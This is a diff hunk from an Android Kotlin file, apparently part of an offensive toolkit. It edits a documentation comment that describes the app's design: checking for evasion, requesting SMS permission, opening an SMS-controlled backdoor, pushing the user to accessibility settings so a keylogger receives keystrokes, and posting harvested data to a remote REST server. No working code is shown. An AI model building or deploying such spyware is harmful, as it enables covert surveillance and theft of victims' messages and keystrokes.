@@ -58,11 +58,13 @@ import kotlinx.coroutines.runBlocking
 * @date 10/08/20
 *
 *  [Context.evade] is used to check whether it is safe before using [KotlinPermissions.ask] to request [RECEIVE_SMS] permission. The [onAccepted] callback is where your optional
- *  payload to run inside of [BackdoorService] will be initialized. After this, [SmsBackdoor.open] is used to open the backdoor and to allow you to implement your own command handler for remote commands
- *  as they're received. After [SmsBackdoor.open]'s command handler implementation, the user is sent to the accessibility services settings screen for the[Keylogger.subscribe]
- *  method of the payload to be able to receive keystrokes. Our [SmsBackdoor.commandHandler] implementation matches remote commands and then uses [Pickpocket] query functions for
- *  retreiving the data. The data is then serialized and posted to the REST API web server with Ktor [HTTPClient] using a basic authentication credentials.
+*  payload to run in [] will be initialized. After this, [SmsBackdoor.open] is used to open the backdoor and to allow you to implement your own command handler for remote commands
+*  as they're received. After [SmsBackdoor.open]'s command handler implementation, the user is sent to the accessibility services settings screen for the[Keylogger.subscribe] method
+*  of the payload to be able to receive keystrokes. Our [SmsBackdoor.commandHandler] implementation matches remote commands and then uses [Pickpocket] query functions for fetching
+*  the data associated each remote command defined within [RemoteCommands]. The data is then serialized and posted to one of the various endpoints of the web servers' REST API with
+*  Ktor [HTTPClient] using [Auth.basic] feature for basic authentication and the [CIO] [HTTPClientEngine].
 * */
+
 class MainActivity : AppCompatActivity() {
 
     companion object{
